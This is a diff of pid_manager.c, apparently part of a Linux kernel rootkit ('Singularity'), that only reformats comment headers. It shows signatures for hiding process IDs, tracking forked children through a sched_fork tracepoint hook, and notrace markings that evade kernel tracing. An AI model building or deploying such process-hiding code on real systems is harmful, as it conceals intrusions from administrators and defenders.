@@ -1,4 +1,4 @@
-/* pid_manager.c — PID hiding management + fork tracking
+/* pid_manager.c   PID hiding management + fork tracking
  * Merge of Singularity hidden_pids.c + trace.c
  * No arch-specific code needed.
  */
@@ -15,7 +15,7 @@ int  child_count  = 0;
 
 static DEFINE_SPINLOCK(hidden_pids_lock);
 
-/* ── Count ──────────────────────────────────────────────────── */
+/*  Count                                                    */
 
 notrace int hidden_pid_count(void)
 {
@@ -37,7 +37,7 @@ notrace int child_pid_count(void)
     return count;
 }
 
-/* ── Snapshot ────────────────────────────────────────────────── */
+/*  Snapshot                                                  */
 
 notrace int hidden_pids_snapshot(int *dst, int max_entries)
 {
@@ -67,7 +67,7 @@ notrace int child_pids_snapshot(int *dst, int max_entries)
     return n;
 }
 
-/* ── Child PID ───────────────────────────────────────────────── */
+/*  Child PID                                                 */
 
 notrace void add_child_pid(int pid)
 {
@@ -116,7 +116,7 @@ notrace int is_child_pid(int pid)
     return found;
 }
 
-/* ── Hidden PID ──────────────────────────────────────────────── */
+/*  Hidden PID                                                */
 
 notrace void add_hidden_pid(int pid)
 {
@@ -184,7 +184,7 @@ notrace int is_hidden_pid(int pid)
     return found;
 }
 
-/* ── Fork tracing ────────────────────────────────────────────── */
+/*  Fork tracing                                              */
 
 static struct tracepoint *tp_sched_fork;
 static int (*_probe_register)(struct tracepoint *, void *, void *);
@@ -201,7 +201,7 @@ notrace static void on_fork_handler(void *data,
     }
 }
 
-/* ── Init / Exit ─────────────────────────────────────────────── */
+/*  Init / Exit                                               */
 
 int pid_manager_init(void)
 {
